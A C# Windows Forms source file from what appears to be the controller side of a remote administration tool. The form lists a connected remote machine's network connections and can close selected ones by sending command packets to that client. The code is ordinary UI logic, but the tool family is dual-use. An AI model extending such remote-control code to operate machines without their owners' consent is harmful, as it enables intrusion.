using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmConnections : Form
    {
        private readonly Client _connectClient;
        Dictionary<string, ListViewGroup> Groups = new Dictionary<string, ListViewGroup>();

        public FrmConnections(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmCon = this;

            InitializeComponent();
        }

        private void lstConnections_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            this.lstConnections.LvwColumnSorter.NeedNumberCompare = (e.Column == 2 || e.Column == 4);
        }

        private void FrmConnections_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.lstConnections.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.lstConnections_ColumnClick);

                this.Text = WindowHelper.GetWindowTitle("Connections", _connectClient);
                new Core.Packets.ServerPackets.GetConnections().Execute(_connectClient);
            }
        }

        public void AddConnectionToListview(string processName, string localaddress, string localport, string remoteaddress, string remoteport, string state)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                   processName, localaddress, localport, remoteaddress , remoteport,  state
                });

                lstConnections.Invoke((MethodInvoker)delegate
                {
                    if (!Groups.ContainsKey(state))
                    {
                        ListViewGroup g = new ListViewGroup(state, state);
                        lstConnections.Groups.Add(g);
                        Groups.Add(state, g);
                    }
                    lvi.Group = lstConnections.Groups[state];
                    lstConnections.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void ClearListviewItems()
        {
            try
            {
                lstConnections.Invoke((MethodInvoker)delegate
                {
                    lstConnections.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmConnections_FormClosing(object sender, FormClosingEventArgs e)
        {

            if (_connectClient.Value != null)
                _connectClient.Value.FrmCon = null;

        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                new Core.Packets.ServerPackets.GetConnections().Execute(_connectClient);
            }
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                foreach (ListViewItem lvi in lstConnections.SelectedItems)
                {
                    //send local and remote ports of connection
                    new Core.Packets.ServerPackets.DoCloseConnection(int.Parse(lvi.SubItems[2].Text),
                        int.Parse(lvi.SubItems[4].Text)).Execute(_connectClient);
                }
            }
        }
    }
}
